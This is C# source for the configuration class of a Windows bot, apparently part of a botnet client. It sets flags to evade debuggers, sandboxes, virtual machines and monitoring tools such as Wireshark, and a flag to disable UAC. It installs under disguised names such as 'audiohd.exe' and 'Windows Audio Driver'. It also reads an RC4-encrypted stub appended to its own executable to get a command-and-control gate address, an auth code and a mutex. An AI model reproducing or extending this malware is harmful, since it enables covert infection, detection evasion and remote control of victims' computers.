using System;
using System.IO;
using System.Text;
using System.Diagnostics;

namespace SysDriver
{
    /* Copyright © 2010 w!cked */

    class cConfig
    {
        public bool bAntiCain = true;
        public bool bAntiSandboxie = true;
        public bool bAntiDebugger = true;
        public bool bAntiEmulator = true;
        public bool bAntiFilemon = true;
        public bool bAntiNetstat = true;
        public bool bAntiNetworkmon = true;
        public bool bAntiParallelsDesktop = true;
        public bool bAntiProcessmon = true;
        public bool bAntiRegmon = true;
        public bool bAntiTCPView = true;
        public bool bAntiVirtualBox = true;
        public bool bAntiVirtualPC = true;
        public bool bAntiVMWare = true;
        public bool bAntiWireshark = true;
        public bool bDisableUAC = true;
        public string[] sFileName = new string[2] { "audiohd.exe", "WUDHost.exe" };
        public string[] sRegName = new string[2] { "Windows Audio Driver", "Windows-Network Component" };
        public string[] sFilePath = new string[2];
        public string sCServerAddress = string.Empty;
        public string sMutex = string.Empty;
        public string sAuthCode = string.Empty;
        public string sBotVersion = "1.0.5.0";
        public int iConnectionInterval = 0;
        public int iPersistentInterval = 30;
        public string sHWID = string.Empty;
        public string sWinVersion = string.Empty;
        public string sPCName = Environment.MachineName;
        public bool bAdminStatus = false;
        private string sSplit = "XPADDINGX";
        private string sCryptPW = "N0PE";

        public cConfig()
        {
            loadInfos();

            //sCServerAddress = "http://***.net/nope/gate.php";
            //sAuthCode = "N0PE";
            //sMutex = "testxx";
            //iConnectionInterval = 10;
        }

        private void loadInfos()
        {
            StreamReader rReader;
            string sStub = string.Empty;

            rReader = new StreamReader(Process.GetCurrentProcess().MainModule.FileName.ToString());
            sStub = rReader.ReadToEnd();
            rReader.Close();

            try
            {
                sStub = sStub.Substring((sStub.Length - 460), 460).Replace(Convert.ToChar(0x00), Convert.ToChar(0x20)).Trim();
                byte[] bData = Convert.FromBase64String(sStub);
                cCrypt.RC4(ref bData, sCryptPW);

                string[] sData = Encoding.Default.GetString(bData).Split(new string[] { sSplit }, StringSplitOptions.None);

                sCServerAddress = sData[1];
                iConnectionInterval = int.Parse(sData[2].Trim());
                sAuthCode = sData[3].Trim();
                sMutex = sData[4].Trim();
            }
            catch { Environment.Exit(0); }
        }
    }
}
